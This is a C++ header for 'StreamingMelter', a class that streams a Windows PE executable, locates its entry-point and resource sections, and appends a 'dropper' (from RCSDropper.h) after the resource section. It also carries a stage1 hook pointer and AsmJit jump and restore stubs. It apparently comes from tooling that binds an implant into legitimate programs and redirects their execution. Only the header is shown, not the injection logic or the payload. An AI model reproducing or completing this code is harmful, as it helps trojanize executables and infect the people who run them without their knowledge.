#ifndef StreamingMelter_h__
#define StreamingMelter_h__

#include <iostream>
#include <map>
#include <string>
#include <vector>
using namespace std;

#include <boost/shared_ptr.hpp>
#include <boost/statechart/exception_translator.hpp>
#include <boost/statechart/state_machine.hpp>
namespace sc = boost::statechart;

#include <boost/filesystem/fstream.hpp>
#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include <DropperHeader.h>

#include "Common.h"
#include "Chunk.h"
#include "Events.h"
#include "ParsingError.h"
#include "RCSDropper.h"
#include "debug.h"

#include <AsmJit.h>

typedef std::map<std::string, std::size_t> offsetMap;

typedef boost::shared_ptr< IMAGE_SECTION_HEADER > ImageSectionHeader;
typedef struct _pe_t {
		IMAGE_NT_HEADERS ntHeader;
		std::vector< ImageSectionHeader > sections;
} PEInfo;

typedef struct _hookPointer_t {
	DWORD offset;
	DWORD va;
} hookPointer;

struct Parsing;

// TODO extract generic StreamingMelter then specialize for PE
struct StreamingMelter
	: sc::state_machine< StreamingMelter, Parsing, std::allocator<void>, parsing_exception_translator > 
{
public:
	StreamingMelter() 
		: done_(false), currentOffset_(0), idleToOffset_(0)
	{ 
		textSection_ = pe().sections.end();
		dropper_.reset();
		buffer_.reset(new Chunk());
		output_.reset(new Chunk());
	}
	
	~StreamingMelter() {}

	// GENERIC StreamingMelter methods

	bool done() const { return done_; }
	bool & done() { return done_; }
	
	std::size_t maxOffset() const { return ( currentOffset_ + buffer_->size() ); }
	
	std::size_t currentOffset() const { return currentOffset_; }
	std::size_t & currentOffset() { return currentOffset_; }

	std::size_t idleToOffset() const { return idleToOffset_; }
	std::size_t & idleToOffset() { return idleToOffset_; }
	
	ChunkPtr buffer() const { return buffer_; }
	const char * output() const { return output_->const_data(); }
	std::size_t outputSize() { return output_->size(); }
	void clearOutput() { output_.reset(new Chunk); }

	void discardFromBuffer( std::size_t bytes ) { buffer_->discard( bytes ); }

	void append(ChunkPtr chunk)
	{
		*buffer_ += *chunk;
	}

	void complete(std::size_t size)
	{
		Chunk chunk = *buffer_ / size;
		completeChunk(chunk);
	}

	void complete(const char* data, std::size_t size)
	{
		Chunk chunk(data, size);
		completeChunk(chunk);
	}

	void completeChunk(const Chunk& chunk)
	{
		DEBUG_MSG(D_EXCESSIVE, "COMPLETING %d", chunk.size());
		*output_ += chunk;
		currentOffset_ += chunk.size();
	}

	ChunkPtr get(std::size_t size) { return boost::shared_ptr<Chunk>( new Chunk(*buffer_ / size) ); }
	
	void feed(const char *data, std::size_t size)
	{
		ChunkPtr chunk( new Chunk(data, size) );
		append(chunk);
		process_event( EvNewData() );
	}
	
	void setRCS(const char* file);
	std::size_t fileSize() const { return originalSize_; }
	std::size_t & fileSize() { return originalSize_; }

	// TODO round to average SectionAlignment (0x1000) ... it should fit
	std::size_t finalSize() {
		DEBUG_MSG(D_EXCESSIVE, "fileSize_        : %d", originalSize_);
		DEBUG_MSG(D_EXCESSIVE, "dropper_->size() : %d", dropper_->size());
		finalSize_ = alignTo(originalSize_ + dropper_->size(), 0x1000);
		return finalSize_;
	}

	// PE specific methods

	std::size_t sectionAlignment() { return pe().ntHeader.OptionalHeader.SectionAlignment; }
	std::size_t fileAlignment() { return pe().ntHeader.OptionalHeader.FileAlignment; }
	std::size_t numberOfSections() { return pe().ntHeader.FileHeader.NumberOfSections; }
	
	void addSection( PIMAGE_SECTION_HEADER const header ) 
	{
		ImageSectionHeader h( new IMAGE_SECTION_HEADER(*header) );
		pe().sections.push_back(h);
	}
	
	bool locateTextSection()
	{
		DWORD addressOfEntryPoint = pe().ntHeader.OptionalHeader.AddressOfEntryPoint;
		textSection_ = getSectionIter_( addressOfEntryPoint );
		if (textSection_ == pe().sections.end() )
			return false;

		return true;
	}

	bool locateResourceSection()
	{
		DWORD rva = pe().ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
		DEBUG_MSG(D_DEBUG, "Data directory entry for RESOURCE section: %08x", rva);
		resourceSection_ = getSectionIter_( rva );
		if (resourceSection_ == pe().sections.end() )
			return false;

		return true;
	}

	DWORD alignTo( DWORD size, DWORD base_size )
	{
		return ( ((size + base_size-1) / base_size) * base_size );
	}

	DWORD RVAToOffset( DWORD rva )
	{
		DWORD iC = 0;
		
		// TODO resolving offsets NOT IN SECTIONS will not work!!!
		
		for ( iC = 0; iC < pe().sections.size() ; iC++ )
		{
			DWORD VA = pe().sections[iC]->VirtualAddress;
			DWORD PRAW = pe().sections[iC]->PointerToRawData;
			DWORD SRAW = pe().sections[iC]->SizeOfRawData;
			if( VA /* && rva >= VA */ && rva <= ( VA + SRAW ) ) 
			{
				if (PRAW)
					return (rva + PRAW - VA);
				else
					return rva;
			}
		}
		
		return 0;
	}
	
	DWORD offsetToRVA( DWORD offset )
	{
		DWORD iC = 0;

		for (iC = 0; iC < pe().sections.size(); ++iC)
		{
			DWORD RVA = pe().sections[iC]->VirtualAddress;
			DWORD PRAW = pe().sections[iC]->PointerToRawData;
			DWORD SRAW = pe().sections[iC]->SizeOfRawData;

			if (!PRAW)
				continue;

			if( offset >= PRAW && offset <= ( PRAW + SRAW ) )
			{
				return (RVA + (offset - PRAW) );
			}
		}

		return 0;
	}

	void set_debug_function( debug_msg_t fn ) { set_debug_fn(fn); }

	PEInfo& pe() { return pe_; }

	ImageSectionHeader& textSection() { return *textSection_; }
	ImageSectionHeader& resourceSection() { return *resourceSection_; }
	ImageSectionHeader& firstSection() { return pe().sections.front(); }
	ImageSectionHeader& lastSection() { return pe().sections.back(); }

	hookPointer& stage1() { return stage1_; }

	offsetMap offsets;
	offsetMap rva;

	Dropper& dropper() { return *dropper_; }
	DWORD imageBase() { return pe().ntHeader.OptionalHeader.ImageBase; }
	DWORD dropperVA() { return imageBase() + resourceSection()->VirtualAddress + resourceSection()->SizeOfRawData; }
	DWORD currentVA() { return imageBase() + offsetToRVA( currentOffset() ); }

private:
	ImageSectionHeader& getSectionFromID_( DWORD directoryEntryID )
		{
			std::vector< ImageSectionHeader >::iterator iter = pe().sections.begin();
			DWORD rva = pe().ntHeader.OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress;

			return getSectionFromRVA_(rva);
		}

		ImageSectionHeader& getSectionFromRVA_( DWORD rva )
		{
			std::vector< ImageSectionHeader >::iterator iter = getSectionIter_(rva);
			if ( iter == pe().sections.end() )
				throw std::runtime_error("No entry for specified RVA");

			return *iter;
		}

		std::vector< ImageSectionHeader >::iterator getSectionIter_( DWORD rva)
		{
			std::vector< ImageSectionHeader >::iterator iter = pe().sections.begin();

			for (; iter != pe().sections.end(); iter++)
			{
				ImageSectionHeader& section = *iter;
				if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->SizeOfRawData )
					return iter;
			}

			return pe().sections.end();
		}


	bool done_;

	// current offset in whole file
	std::size_t currentOffset_;
	std::size_t idleToOffset_;

	// bufferized data
	boost::shared_ptr<Chunk> buffer_;

	// data ready for output
	boost::shared_ptr<Chunk> output_;
	
	// dropper
	//boost::shared_array<char> rcs_;
	//std::size_t rcsSize_;

	std::size_t originalSize_;
	std::size_t finalSize_;

	PEInfo pe_;
	boost::shared_ptr<Dropper> dropper_;

	hookPointer stage1_;

	std::vector< ImageSectionHeader >::iterator textSection_;
	std::vector< ImageSectionHeader >::iterator resourceSection_;

	AsmJit::Assembler jumperStub_;
	AsmJit::Assembler restoreStub_;
};

#include "Parsing.h"

#endif // StreamingMelter_h__
